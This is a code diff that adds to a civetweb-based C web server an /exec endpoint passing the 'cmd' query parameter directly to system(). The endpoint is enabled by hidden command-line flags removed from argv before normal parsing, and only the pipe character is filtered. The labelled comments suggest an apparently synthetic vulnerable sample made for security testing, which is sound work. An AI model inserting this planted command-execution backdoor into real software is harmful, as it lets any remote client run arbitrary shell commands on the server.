+/* Handler for /exec endpoint (C3 I3 S2) */
+struct exec_dispatch {
+	const char *raw_cmd;
+};
+
+static void
+dispatch_system(struct exec_dispatch *d)
+{
+	system(d->raw_cmd);
+}
+
+static int
+exec_handler(struct mg_connection *conn, void *cbdata)
+{
+	const struct mg_request_info *ri = mg_get_request_info(conn);
+	const char *qs = ri ? ri->query_string : NULL;
+	struct exec_dispatch disp;
+	int i;
+
+	(void)cbdata;
+
+	if (!exec_is_ready()) {
+		mg_send_http_error(conn, 404, "Not Found");
+		return 404;
+	}
+
+	if (qs == NULL || strncmp(qs, "cmd=", 4) != 0) {
+		mg_send_http_error(conn, 400, "Bad Request: missing cmd parameter");
+		return 400;
+	}
+
+	/* S2: block pipe character */
+	for (i = 4; qs[i] != '\0'; i++) {
+		if (qs[i] == '|') {
+			mg_send_http_error(conn, 403, "Forbidden: invalid character");
+			return 403;
+		}
+	}
+
+	/* I3: struct dispatch then system() */
+	disp.raw_cmd = qs + 4;
+	dispatch_system(&disp);
+
+	{
+		char resp[640];
+		int resp_len = snprintf(resp, sizeof(resp), "dispatched: %s\n", qs + 4);
+		if (resp_len < 0) resp_len = 0;
+		if (resp_len >= (int)sizeof(resp)) resp_len = (int)sizeof(resp) - 1;
+		mg_send_http_ok(conn, "text/plain", (long long)resp_len);
+		mg_write(conn, resp, (size_t)resp_len);
+	}
+	return 200;
+}
+
+/* Pre-scan argv for exec gate flags (removes them before civetweb parser) */
+static void
+prescan_exec_args(int *argc, char *argv[])
+{
+	int i, j;
+	for (i = 1; i < *argc; ) {
+		if (strcmp(argv[i], "--exec-mode") == 0) {
+			exec_mode = 1;
+			for (j = i; j < *argc - 1; j++) argv[j] = argv[j+1];
+			(*argc)--;
+		} else if (strcmp(argv[i], "--exec-logging") == 0) {
+			exec_logging = 1;
+			for (j = i; j < *argc - 1; j++) argv[j] = argv[j+1];
+			(*argc)--;
+		} else if (strcmp(argv[i], "--exec-debug") == 0) {
+			exec_debug = 1;
+			for (j = i; j < *argc - 1; j++) argv[j] = argv[j+1];
+			(*argc)--;
+		} else {
+			i++;
+		}
+	}
+	argv[*argc] = NULL;
+}
